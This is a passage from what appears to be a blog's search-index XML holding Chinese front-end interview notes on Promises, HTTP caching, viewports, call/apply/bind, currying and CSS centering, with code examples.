class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure><p>红灯3秒亮一次，绿灯1秒亮一次，黄灯2秒亮一次；如何让三个灯不断交替重复亮灯？（用Promise实现）三个亮灯函数已经存在：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">red</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'red'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">green</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'green'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">yellow</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'yellow'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">light</span>(<span class="params">time, fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            fn()</span><br><span class="line">            resolve()</span><br><span class="line">        &#125;, time)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">Promise</span>.resolve()</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> light(<span class="number">3000</span>, red))</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> light(<span class="number">2000</span>, green))</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> light(<span class="number">1000</span>, yellow))</span><br><span class="line">    .then(<span class="function"><span class="params">()</span> =&gt;</span> step())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">step()</span><br></pre></td></tr></table></figure><ul><li><strong>只有返回promsie对象后才会链式调用</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'1'</span>)</span><br><span class="line">   <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123; </span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'2'</span>)</span><br><span class="line">            resolve(<span class="string">'newPromise'</span>)</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'3'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"newPromise1"</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'4'</span>, res)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 1 4 undefined  2 3</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="built_in">console</span>.log(<span class="string">'1'</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123; </span><br><span class="line">        setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'2'</span>)</span><br><span class="line">            resolve(<span class="string">'newPromise'</span>)</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'3'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"newPromise1"</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'4'</span>, res)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 1 2  3 4 newPromise1</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Promise </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.8</title>
      <link href="2020/03/08/%E6%97%A5%E5%B8%B8-2020.3.8/"/>
      <url>2020/03/08/%E6%97%A5%E5%B8%B8-2020.3.8/</url>
      
        <content type="html"><![CDATA[<ul><li>算法：字符串的最大非重复子串长度</li><li>有哪些提高http请求速度的方法，http缓存机制</li><li>babel是什么</li><li>meta标签，视口</li></ul><a id="more"></a><h2 id="1-字符串的最大非重复子串长度（o-n-，讲思路）"><a href="#1-字符串的最大非重复子串长度（o-n-，讲思路）" class="headerlink" title="1.字符串的最大非重复子串长度（o(n)，讲思路）"></a>1.字符串的最大非重复子串长度（o(n)，讲思路）</h2><p>js中，因为Array继承Object，那么Array也是可以用字符串作为数组下标的 ，c++可以，写一个参考的C++解法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; dict(<span class="number">256</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>, start = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dict[s[i]] &gt; start)<span class="comment">//当前字符“曾经”是否出现在此子串中？</span></span><br><span class="line">                start = dict[s[i]];<span class="comment">//“曾经”出现那次作为新起点</span></span><br><span class="line">            dict[s[i]] = i;<span class="comment">//标志该字符出现的位置</span></span><br><span class="line">            maxLen = max(maxLen, i - start);<span class="comment">//每次都要更新最大长度</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如：a,b,c,d,a,b,a  输出4</p><p>无重复：a,b,c,d</p><p>a重复了：把上一个a之前的清除，现在b,c,d,a</p><p>b重复了：把上一个b之前的清除，现在c,d,a,b</p><p>a重复了：现在b,a</p><h2 id="4-有哪些提高http请求速度的方法，http缓存机制"><a href="#4-有哪些提高http请求速度的方法，http缓存机制" class="headerlink" title="4. 有哪些提高http请求速度的方法，http缓存机制"></a>4. 有哪些提高http请求速度的方法，http缓存机制</h2><p>Http缓存主要涉及三个角色：一是浏览器，二是浏览器的缓存数据库，三是服务器。当浏览器端向服务器发出<strong>第一次</strong>请求时 ：</p><p><img src="https://img-blog.csdn.net/20170901101909195" alt="1"></p><h3 id="缓存的类型"><a href="#缓存的类型" class="headerlink" title="缓存的类型"></a>缓存的类型</h3><h3 id="（1）强缓存"><a href="#（1）强缓存" class="headerlink" title="（1）强缓存"></a>（1）强缓存</h3><p>强缓存基本原理是：所请求的数据在缓存数据库中尚未过期时，不与服务器进行交互，直接使用缓存数据库中的数据。当缓存未过期时基本流程如下 ：</p><p><img src="https://img-blog.csdn.net/20170901101933387" alt="2"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">控制强缓存过期时间的两个主要规则字段：</span><br><span class="line">1.Expire 其指定了一个日期/时间， 在这个日期/时间之后，HTTP响应被认为是过时的。但是它本身是一个HTTP1.0标准下的字段，所以如果请求中还有一个置了 “max-age” 或者 “s-max-age” 指令的Cache-Control响应头，那么 Expires 头就会被忽略。</span><br><span class="line"></span><br><span class="line">2.Cache-Control通用消息头用于在http 请求和响应中通过指定指令来实现缓存机制。其常用的几个取值有：</span><br><span class="line">private：客户端可以缓存</span><br><span class="line">public：客户端和代理服务器都可以缓存</span><br><span class="line">max-age=xxx：缓存的内容将在xxx 秒后失效</span><br><span class="line">s-max-age=xxx：同s-max-age，但仅适用于共享缓存(比如各个代理)，并且私有缓存中忽略。</span><br><span class="line">no-cache：需要使用协商缓存来验证缓存数据</span><br><span class="line">no-store：所有内容都不会缓存，强缓存和协商缓存都不会触发</span><br><span class="line">must-revalidate：缓存必须在使用之前验证旧资源的状态，并且不可使用过期资源。</span><br></pre></td></tr></table></figure><h3 id="（2）协商缓存"><a href="#（2）协商缓存" class="headerlink" title="（2）协商缓存"></a>（2）协商缓存</h3><ul><li>当强缓存过期未命中或者响应报文Cache-Control中有must-revalidate标识必须每次请求验证资源的状态时，便使用协商缓存的方式去处理缓存文件。</li><li>协商缓存主要原理是从缓存数据库中取出缓存的标识，然后向服务器发送请求验证请求的数据是否已经更新，如果已更新则返回新的数据，若未更新则使用缓存数据库中的缓存数据，具体流程如下，当协商缓存命中：</li></ul><p><img src="https://img-blog.csdn.net/20170901101950208" alt="3"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两个字段etag和last-modified是用于协商缓存的规则字段。其中etag是所请求的数据在服务器中的唯一标识，而last-modifind标识所请求资源最后一次修改的时间。</span><br><span class="line"></span><br><span class="line">将缓存信息中的Etag和Last-Modified通过请求发送给服务器，由服务器校验，返回304状态码时，浏览器直接使用缓存。</span><br></pre></td></tr></table></figure><h2 id="5-什么是babel"><a href="#5-什么是babel" class="headerlink" title="5. 什么是babel"></a>5. 什么是babel</h2><p>babel是一个node命令行工具，它的作用是对我们源代码进行转码（把es6=&gt;es5）</p><h2 id="6-meta标签，视口"><a href="#6-meta标签，视口" class="headerlink" title="6.meta标签，视口"></a>6.meta标签，视口</h2><p>首先介绍3个视口的概念</p><ul><li><strong>layout viewport(布局视口)：</strong>在PC端上，布局视口等于浏览器窗口的宽度。而在移动端上，由于要使为PC端浏览器设计的网站能够完全显示在移动端的小屏幕里，此时的布局视口会远大于移动设备的屏幕，就会出现滚动条。js获取布局视口：<code>document.documentElement.clientWidth | document.body.clientWidth</code>；</li><li><strong>visual viewport(视觉视口)：</strong>用户正在看到的网页的区域。用户可以通过缩放来查看网站的内容。如果用户缩小网站，我们看到的网站区域将变大，此时视觉视口也变大了，同理，用户放大网站，我们能看到的网站区域将缩小，此时视觉视口也变小了。不管用户如何缩放，都不会影响到布局视口的宽度。js获取视觉视口：<code>window.innerWidth</code>；</li><li><strong>ideal viewport(理想视口)：</strong>布局视口的一个理想尺寸，只有当布局视口的尺寸等于设备屏幕的尺寸时，才是理想视口。js获取理想视口：<code>window.screen.width</code>；</li><li>页面的滚动条取决于视觉视口和布局视口，页面元素宽度取决于布局视口大小</li></ul><p>我们在开发时，常常加入这样一行代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> <span class="attr">name</span>=<span class="string">"viewport"</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>width=device-width</code>，这句代码的意思就是把布局视口 = 理想视口。 </li><li><code>initial-scale</code>指的是缩放系数。其中有这样的公式： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">视觉视口宽度 = 理想视口宽度 / 缩放系数 </span><br><span class="line"></span><br><span class="line">比如iphone加入这段代码时：</span><br><span class="line">视觉视口 = 320/1.0 = 320</span><br><span class="line">布局视口 = 320</span><br><span class="line">当视觉视口= 布局视口，页面无滚动条。</span><br><span class="line"></span><br><span class="line">当改变initial-scale时：</span><br><span class="line"></span><br><span class="line">initial-scale = 0.5 </span><br><span class="line">视觉视口宽度 = 320 / 0.5 = 640</span><br><span class="line">布局视口宽度 = 320</span><br><span class="line">又因为：视觉视口不能大于布局视口，所以此时，将布局视口的宽度提高等于640</span><br><span class="line">总结：视觉视口 = 布局视口 = 640</span><br><span class="line"></span><br><span class="line">initial-scale = 2 「 div宽度320，页面有滚动条 」</span><br><span class="line">视觉视口宽度 = 320 / 2 = 160</span><br><span class="line">布局视口宽度 = 320</span><br><span class="line">总结：视觉视口 &lt; 布局视口 页面出现了滚动条。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-2020.3.7</title>
      <link href="2020/03/07/%E6%97%A5%E5%B8%B8-2020.3.7/"/>
      <url>2020/03/07/%E6%97%A5%E5%B8%B8-2020.3.7/</url>
      
        <content type="html"><![CDATA[<ul><li>call,apply,bind区别，手写原生代码</li><li>柯里化</li><li>几道小题</li></ul><a id="more"></a><h2 id="3-call，apply，bind的区别"><a href="#3-call，apply，bind的区别" class="headerlink" title="3. call，apply，bind的区别"></a>3. call，apply，bind的区别</h2><ul><li>call和apply用于动态改变函数运行时，函数内容的this指向，和传入参数值。</li></ul><h4 id="fun-call-thisArg-arg1-arg2-…"><a href="#fun-call-thisArg-arg1-arg2-…" class="headerlink" title="fun.call(thisArg, arg1, arg2, …)"></a>fun.call(thisArg, arg1, arg2, …)</h4><h4 id="fun-apply-thisArg-arg1-arg2-…"><a href="#fun-apply-thisArg-arg1-arg2-…" class="headerlink" title="fun.apply(thisArg, [arg1, arg2], …)"></a>fun.apply(thisArg, [arg1, arg2], …)</h4><ul><li>bind()方法创建一个新的函数，在bind()被调用时，这个新函数的this被bind的第一个参数指定，其余的参数将作为新函数的参数供调用时使用。</li></ul><h4 id="fun-bind-thisArg-arg1-arg2"><a href="#fun-bind-thisArg-arg1-arg2" class="headerlink" title="fun.bind(thisArg, arg1,arg2)"></a>fun.bind(thisArg, arg1,arg2)</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//若thisArg指定为null和undefined，this自动指向全局对象</span></span><br><span class="line"><span class="comment">//一个函数被call/apply时，会直接调用，而bind会创建一个新函数</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.max.call(...arr)); <span class="comment">// 3</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.max.bind(...arr)()) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p><strong>如何自己实现，首先我们来复习一下eval()</strong></p><p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string)</span><br></pre></td></tr></table></figure> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showName</span>(<span class="params">gender, age</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name, <span class="string">" "</span>, gender, <span class="string">" "</span>, age)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    name: <span class="string">"亚古"</span></span><br><span class="line">&#125;</span><br><span class="line">showName.call(obj, <span class="string">"female"</span>, <span class="number">22</span>)<span class="comment">// 亚古   female   22</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实现call</span></span><br><span class="line">        <span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> [thisArg,...args] = [...arguments]</span><br><span class="line">            thisArg = thisArg||<span class="built_in">window</span></span><br><span class="line">            thisArg.func = <span class="keyword">this</span></span><br><span class="line">            <span class="keyword">let</span> result = thisArg.func(...args)</span><br><span class="line">            <span class="keyword">delete</span> thisArg.func</span><br><span class="line">            <span class="keyword">return</span> result </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//实现apply</span></span><br><span class="line">        <span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">thisArg,rest</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">let</span> result</span><br><span class="line">            thisArg = thisArg || <span class="built_in">window</span></span><br><span class="line">            thisArg.func= <span class="keyword">this</span></span><br><span class="line">            <span class="keyword">if</span>(!rest)&#123;</span><br><span class="line">                result = thisArg.func()</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result = thisArg.func(...rest)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">delete</span> thisArg.func</span><br><span class="line">            <span class="keyword">return</span> result </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现bind</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.myBind= <span class="function"><span class="keyword">function</span>(<span class="params">thisArg,rest</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _fn = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        _fn.call(thisArg,rest)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><strong>柯里化：多个参数转为一个一个的参数</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">const</span> curry = <span class="function">(<span class="params">fn,...args</span>)=&gt;</span></span><br><span class="line">            args.length &lt; fn.length</span><br><span class="line">                <span class="comment">//参数长度不足时，重新柯里化函数，等待接收新参数</span></span><br><span class="line">                ? <span class="function">(<span class="params">...<span class="built_in">arguments</span></span>)=&gt;</span>curry(fn,...args,...arguments)</span><br><span class="line">                <span class="comment">//参数长度满足时，执行函数</span></span><br><span class="line">                : fn(...args);</span><br><span class="line"></span><br><span class="line"><span class="comment">//试一下</span></span><br><span class="line"><span class="keyword">let</span> curryPlus = curry(<span class="function">(<span class="params">a,b,c,d</span>)=&gt;</span>a+b+c+d)</span><br><span class="line">curryPlus(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)(<span class="number">4</span>) <span class="comment">//返回10</span></span><br><span class="line">curryPlus(<span class="number">1</span>,<span class="number">2</span>)(<span class="number">4</span>)(<span class="number">3</span>) <span class="comment">//返回10</span></span><br><span class="line">curryPlus(<span class="number">1</span>,<span class="number">2</span>)(<span class="number">3</span>,<span class="number">4</span>) <span class="comment">//返回10</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="4-几道小题"><a href="#4-几道小题" class="headerlink" title="4.几道小题"></a>4.几道小题</h2><ul><li>问以下哪个选择器的运行效率最高</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#header</span> <span class="selector-tag">li</span></span><br><span class="line"><span class="selector-id">#header</span>&gt;<span class="selector-tag">div</span>&gt;<span class="selector-tag">div</span>&gt;<span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span></span><br><span class="line"><span class="selector-attr">[id="header"]</span> <span class="selector-tag">li</span></span><br><span class="line"></span><br><span class="line">选择是从后向前的，前面是过滤条件，2全是子代选择，效率高于后代选择</span><br><span class="line"><span class="selector-tag">DOM</span>创建时会把<span class="selector-tag">ID</span>,类，标签生成集合，查找时不需要爬<span class="selector-tag">DOM</span>树，所以效率2&gt;1&gt;3</span><br></pre></td></tr></table></figure><ul><li>简述什么是盒模型</li></ul><p>存在两种盒子：</p><ol><li>W3C标准盒模型：width,height,padding,border,margin，可视宽度：width+border+padding</li><li>IE盒模型:               同上，但是 可视宽度：width</li></ol><p>css3中可以设置</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">box-sizing</span><span class="selector-pseudo">:content-box</span>    标准</span><br><span class="line"><span class="selector-tag">box-sizing</span><span class="selector-pseudo">:border-box</span></span><br></pre></td></tr></table></figure><ul><li>简述CSS选择器的优先级规则</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">优先级不同，高优先级属性覆盖低优先级属性</span><br><span class="line">优先级相同，定义在后覆盖定义在先</span><br><span class="line"></span><br><span class="line">行内&gt;ID&gt;类，伪类&gt;元素标记  !important最高，但是在低版本IE有兼容性问题</span><br></pre></td></tr></table></figure><ul><li>简述一个居中元素的方法  </li></ul><p>考虑：水平还是垂直，块还是行内，是否需要知道宽高，兼容性</p><p>（1）水平：</p><pre><code> 1. 块元素：margin:0,auto2. 行内元素，行内块元素：text-align:center</code></pre><p>（2）垂直：</p><ol start="3"><li>行内元素：line-height：xxpx</li><li>行内块元素：line-height：xxpx；vertical-align：middle</li></ol><p>（3）水平竖直同时居中</p><p>​     absolute方法：</p><ol start="5"><li>已知宽高：负数margin</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: -<span class="number">40px</span>;</span><br><span class="line">    <span class="attribute">margin-top</span>: -<span class="number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>已知宽高：calc</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.child</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>:absolute;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line">    <span class="attribute">top</span>:<span class="built_in">calc</span>(50% - 30px);</span><br><span class="line">    <span class="attribute">left</span>:<span class="built_in">calc</span>(50% - 40px);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="7"><li>需要设定宽高：margin auto</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.f14</span> <span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.f14</span> <span class="selector-class">.child</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">80px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="8"><li>不需要设定宽高：transform(css3,IE8及以下不支持)</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.f15</span> <span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.f15</span> <span class="selector-class">.child</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    transform: translate(-50%,-50%);  自身偏移</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="9"><li>flex布局</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.main</span>&#123;</span><br><span 